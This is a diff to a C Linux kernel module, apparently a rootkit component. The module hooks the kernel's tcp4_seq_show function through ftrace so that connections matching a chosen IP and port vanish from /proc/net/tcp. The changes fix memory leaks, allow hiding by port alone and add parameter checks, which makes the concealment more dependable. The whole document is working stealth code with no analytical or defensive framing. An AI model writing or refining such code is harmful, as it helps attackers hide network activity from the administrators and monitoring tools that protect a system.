@@ -8,10 +8,10 @@
 void callback_func(unsigned long ip, unsigned long parent_ip, struct ftrace_ops *op, struct pt_regs *regs);
 
 // Types & other consts.
-static char *ip_to_hide;
+static char *ip_to_hide = NULL;
 module_param(ip_to_hide, charp, 0);
 
-static int port_to_hide;
+static int port_to_hide = -1;
 module_param(port_to_hide, int, 0);
 
 typedef int (*original_tcp4_seq_show_t)(struct seq_file *seq, void *v);
@@ -19,7 +19,7 @@ static unsigned long tcp4_seq_show_address;
 static original_tcp4_seq_show_t original_tcp4_seq_ptr;
 static struct ftrace_ops ops = { .func = callback_func, .flags = FTRACE_OPS_FL_SAVE_REGS | FTRACE_OPS_FL_IPMODIFY };
 
-char * ipaddr_to_string(__be32 ipaddr)
+char* ipaddr_to_string(__be32 ipaddr)
 {
     int first = (unsigned char)(ipaddr & 0xFF);
     int second = (unsigned char)((ipaddr >> 8) & 0xFF);
@@ -40,15 +40,17 @@ int new_tcp4_seq_show(struct seq_file *seq, void *v) {
 
     struct sock *sk = v;
     const struct inet_sock *inet = inet_sk(sk);
-    __be32 ipaddr = inet->inet_rcv_saddr;
+    __be32 ipaddr = inet->inet_saddr;
     __u16 port = ntohs(inet->inet_sport);
     
     char *ipstring = ipaddr_to_string(ipaddr);
-    if (!strcmp(ipstring, ip_to_hide) && port == port_to_hide) {
+    if (((ip_to_hide == NULL) && (port == port_to_hide)) || ((ip_to_hide != NULL) && !strcmp(ipstring, ip_to_hide) && (port == port_to_hide))) {
         printk(KERN_ALERT "Hiding %s : %u", ipstring, port);
+        kfree(ipstring);
         return 0;
     }
 
+    kfree(ipstring);
     return original_tcp4_seq_ptr(seq, v);
 }
 
@@ -60,6 +62,10 @@ void notrace callback_func(unsigned long ip, unsigned long parent_ip, struct ftr
 }
  
 int load(void) {
+    if (port_to_hide == -1) {
+        printk("port to hide has not been set! Exiting...");
+        return -1;
+    }
     printk(KERN_ALERT "%s:%d", ip_to_hide, port_to_hide);
 
     printk(KERN_ALERT "Initializing...");
@@ -69,7 +75,6 @@ int load(void) {
         return 0;
     }
 
-    printk(KERN_ALERT "Tcp4_seq_show found %lu", tcp4_seq_show_address);
     original_tcp4_seq_ptr = (original_tcp4_seq_show_t)tcp4_seq_show_address;
     ftrace_set_filter_ip(&ops, (unsigned long)original_tcp4_seq_ptr, 0, 0);
     register_ftrace_function(&ops);
